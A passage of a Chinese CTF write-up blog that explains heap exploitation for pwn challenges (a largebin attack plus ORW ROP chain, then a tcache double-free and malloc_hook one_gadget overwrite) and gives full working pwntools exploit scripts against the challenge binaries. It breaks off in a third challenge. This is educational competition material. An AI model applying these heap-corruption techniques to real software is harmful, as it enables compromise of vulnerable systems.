+<p>​	题目的本意应该是要我们使用smallbin中的attack，但是我们可以非常极限的通过大量的堆块来完成largebin attack（因为选择5有一个可选栈溢出，通过largebin attack到0x4040C0可以获得大量的输入来构造ORW）。</p>
+<p>​	通过非常规方法构造largebin attack非常麻烦。</p>
+<p>​	1.你得先构造两个0x500~0x530的largebin范围的unsortbin，和一个至少小于0x500的unsortbin，此时他们都不是释放状态。</p>
+<p>​	2.此时先释放0x520的块到unsorbin中，然后释放小于0x500的块到unsortbin中，申请一个和你组成unsortbin堆块大小无关的堆块（比如我是通过0x288和0x88凭凑的，就可以申请0x98），此时会从小于0x500的unsortbin分割出0x98的堆块，而0x520的堆块会被释放到largebin中。</p>
+<p>​	3.再释放0x510的堆块到unsortbin中，伪造0x520的堆块的bk_nextsize &#x3D; target - 0x20，此时再次申请0x98的堆块，我们就完成了largebin attack。</p>
+<p>​	通过5号函数的栈溢出即可完成ORW。</p>
+<p>​	exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFF9C</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;size:\n&quot;</span>,stre(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">2</span>))<br>    sela(<span class="hljs-string">b&quot;Idx:\n&quot;</span>,stre(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">3</span>))<br>    sela(<span class="hljs-string">b&quot;Idx:\n&quot;</span>,stre(index))<br>    sea(<span class="hljs-string">b&quot;Content:\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">4</span>))<br>    sela(<span class="hljs-string">b&quot;Idx:\n&quot;</span>,stre(index))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):<br>    add(<span class="hljs-number">0x288</span>)<br>    edit(i,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x20</span>)<br><br>add(<span class="hljs-number">0x100</span>)<br>reu(<span class="hljs-string">b&quot;Ptr: &quot;</span>)<br>heap_addr = <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br>ph(heap_addr,<span class="hljs-string">&quot;heap_addr&quot;</span>)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&quot;flag\x00&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):<br>    dele(i)<br><br>show(<span class="hljs-number">7</span>)<br><br>libc_base = raddr64() - <span class="hljs-number">0x1ecbe0</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br><br>openat_addr = libc_base + libc.sym[<span class="hljs-string">&quot;openat&quot;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libc_base + <span class="hljs-number">0x2601f</span><br>pop_rdx_rbx = libc_base + <span class="hljs-number">0x15fae6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">18</span>):<br>    add(<span class="hljs-number">0x88</span>)<br><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#18</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#19</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#20</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#21</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#22</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#23</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#24</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#25</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#26</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#27</span><br>add(<span class="hljs-number">0x288</span>) <span class="hljs-comment">#28</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">18</span>):<br>    dele(i)<br><br>dele(<span class="hljs-number">18</span>)<br>dele(<span class="hljs-number">19</span>)<br>dele(<span class="hljs-number">20</span>)<br>dele(<span class="hljs-number">21</span>)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#29</span><br>dele(<span class="hljs-number">23</span>)<br>dele(<span class="hljs-number">24</span>)<br><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#30</span><br>add(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#31</span><br>dele(<span class="hljs-number">31</span>)<br><br>edit(<span class="hljs-number">23</span>,p64(libc_base + <span class="hljs-number">0x1ed030</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4040C0</span>-<span class="hljs-number">0x20</span>))<br><br>dele(<span class="hljs-number">26</span>)<br>dele(<span class="hljs-number">27</span>)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment">#32</span><br><br>sela(<span class="hljs-string">b&quot;choice:&quot;</span>,stre(<span class="hljs-number">5</span>))<br>sleep(<span class="hljs-number">0.1</span>)<br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x38</span> + orw_rop64(pop_rdi,pop_rsi,pop_rdx_rbx,heap_addr,openat_addr,read_addr,write_addr)<br>se(payload)<br><br>op()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="mini-notebook"><a href="#mini-notebook" class="headerlink" title="mini_notebook"></a><strong>mini_notebook</strong></h3><p>​	check:</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431244048.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	保护全开</p>
+<p>​	漏洞点：</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431311058.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	uaf漏洞。</p>
+<p>​	思路：</p>
+<p>​	通过tcache的double free打tcache头暴露libc基地址，然后打malloc_hook。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;size???&quot;</span>,stre(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>():<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">3</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">content</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">4</span>))<br>    sea(<span class="hljs-string">b&quot;content???&quot;</span>,content)<br><br>add(<span class="hljs-number">0x38</span>)<br>dele()<br><br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>dele()<br><br>show()<br>heap_base = raddr64() - <span class="hljs-number">0x2a0</span><br>ph(heap_base,<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br>edit(p64(heap_base+<span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">0x28</span>)<br>dele()<br>add(<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">0x38</span>)<br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x7000000000000</span>))<br>add(<span class="hljs-number">0x38</span>)<br>dele()<br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>dele()<br><br>edit(p64(heap_base+<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">0x38</span>)<br>dele()<br><br>show()<br>libc_base = raddr64() - <span class="hljs-number">0x1ecbe0</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>one = libc_base + <span class="hljs-number">0xe3b01</span><br><br>edit(p64(<span class="hljs-number">0x30000</span>))<br>add(<span class="hljs-number">0x28</span>)<br>dele()<br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>dele()<br>add(<span class="hljs-number">0x28</span>)<br>edit(p64(malloc_hook))<br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x28</span>)<br>edit(p64(one))<br>add(<span class="hljs-number">0x28</span>)<br><br>op()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="no-leak-heap"><a href="#no-leak-heap" class="headerlink" title="no_leak_heap"></a><strong>no_leak_heap</strong></h3><p>​	check：</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431732423.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	除了PIE其他保护全开。</p>
+<p>​	漏洞点：</p>
+<ol>
+<li></li>
+</ol>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431818549.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	存在uaf漏洞。</p>
+<ol start="2">
+<li></li>
+</ol>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431867320.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	主动泄露堆地址。</p>
+<ol start="3">
+<li></li>
+</ol>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431916114.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	后门函数。</p>
+<p>​	思路：</p>
+<p>​	通过申请大块在堆块上残留libc地址，改其末尾为0x4aed申请到malloc_hook上，修改malloc_hook到后门完成getshell。</p>
+<p>​	exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 